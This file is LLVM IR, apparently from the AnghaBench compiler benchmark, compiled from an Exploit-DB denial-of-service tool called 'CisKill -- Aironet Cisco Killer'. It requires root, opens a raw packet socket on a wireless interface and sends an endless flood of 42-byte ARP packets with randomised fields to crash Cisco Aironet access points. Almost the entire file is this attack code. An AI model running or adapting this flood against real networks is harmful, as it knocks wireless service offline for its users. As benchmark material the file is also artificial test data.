; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_1447.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_1447.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr = type { i32, i32 }

@.str = private unnamed_addr constant [77 x i8] c"CisKill -- Aironet Cisco Killer\0ACoded by: Pasv\0ADiscovery credit: Eric Smith\0A\00", align 1
@.str.1 = private unnamed_addr constant [37 x i8] c"Must be root to inject arp packets!\0A\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"wlan0\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"/dev/urandom\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@AF_UNSPEC = common dso_local global i32 0, align 4
@PF_INET = common dso_local global i32 0, align 4
@SOCK_PACKET = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [19 x i8] c"Using device: %s\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [57 x i8] c"Press ctrl+c immediately if you wish to stop\0AGoing in 5\0A\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c" 4\0A\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c" 3\0A\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c" 2\0A\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c" 1!\0A\00", align 1
@pkt = common dso_local global i8* null, align 8
@.str.12 = private unnamed_addr constant [37 x i8] c"#:%ld bytes sent: %d (should be 42)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca %struct.sockaddr, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str, i64 0, i64 0))
  %14 = call i64 (...) @getuid()
  %15 = icmp ne i64 %14, 0
  br i1 %15, label %16, label %19

16:                                               ; preds = %2
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 @exit(i32 1) #3
  unreachable

19:                                               ; preds = %2
  %20 = load i32, i32* %4, align 4
  %21 = icmp ne i32 %20, 2
  br i1 %21, label %22, label %25

22:                                               ; preds = %19
  %23 = load i8*, i8** %10, align 8
  %24 = call i32 @strcpy(i8* %23, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  br label %29

25:                                               ; preds = %19
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  store i8* %28, i8** %10, align 8
  br label %29

29:                                               ; preds = %25, %22
  %30 = call i32* @fopen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %30, i32** %6, align 8
  %31 = load i32*, i32** %6, align 8
  %32 = call i32 @fscanf(i32* %31, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32* %8)
  %33 = load i32*, i32** %6, align 8
  %34 = call i32 @fclose(i32* %33)
  %35 = load i32, i32* %8, align 4
  %36 = call i32 @srand(i32 %35)
  %37 = call i32 @memset(%struct.sockaddr* %12, i32 0, i32 8)
  %38 = load i32, i32* @AF_UNSPEC, align 4
  %39 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %12, i32 0, i32 1
  store i32 %38, i32* %39, align 4
  %40 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %12, i32 0, i32 0
  %41 = load i32, i32* %40, align 4
  %42 = load i8*, i8** %10, align 8
  %43 = call i32 @strncpy(i32 %41, i8* %42, i32 14)
  %44 = load i32, i32* @PF_INET, align 4
  %45 = load i32, i32* @SOCK_PACKET, align 4
  %46 = call i32 @socket(i32 %44, i32 %45, i32 768)
  store i32 %46, i32* %7, align 4
  %47 = load i8*, i8** %10, align 8
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0), i8* %47)
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.7, i64 0, i64 0))
  %50 = call i32 @sleep(i32 1)
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0))
  %52 = call i32 @sleep(i32 1)
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0))
  %54 = call i32 @sleep(i32 1)
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0))
  %56 = call i32 @sleep(i32 1)
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  %58 = call i32 @sleep(i32 1)
  br label %59

59:                                               ; preds = %29, %59
  %60 = call i32 (...) @rand()
  %61 = srem i32 %60, 255
  %62 = call i32 (...) @rand()
  %63 = srem i32 %62, 255
  %64 = add nsw i32 %61, %63
  %65 = call i32 (...) @rand()
  %66 = srem i32 %65, 255
  %67 = add nsw i32 %64, %66
  %68 = call i32 (...) @rand()
  %69 = srem i32 %68, 255
  %70 = add nsw i32 %67, %69
  store i32 %70, i32* %11, align 4
  %71 = load i32, i32* %11, align 4
  %72 = trunc i32 %71 to i8
  %73 = load i8*, i8** @pkt, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 28
  store i8 %72, i8* %74, align 1
  %75 = load i32, i32* %11, align 4
  %76 = trunc i32 %75 to i8
  %77 = load i8*, i8** @pkt, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 38
  store i8 %76, i8* %78, align 1
  %79 = load i64, i64* %9, align 8
  %80 = add nsw i64 %79, 1
  store i64 %80, i64* %9, align 8
  %81 = load i64, i64* %9, align 8
  %82 = load i32, i32* %7, align 4
  %83 = load i8*, i8** @pkt, align 8
  %84 = call i32 @sendto(i32 %82, i8* %83, i32 42, i32 0, %struct.sockaddr* %12, i32 8)
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.12, i64 0, i64 0), i64 %81, i32 %84)
  br label %59
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @getuid(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fscanf(i32*, i8*, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @srand(i32) #1

declare dso_local i32 @memset(%struct.sockaddr*, i32, i32) #1

declare dso_local i32 @strncpy(i32, i8*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @rand(...) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
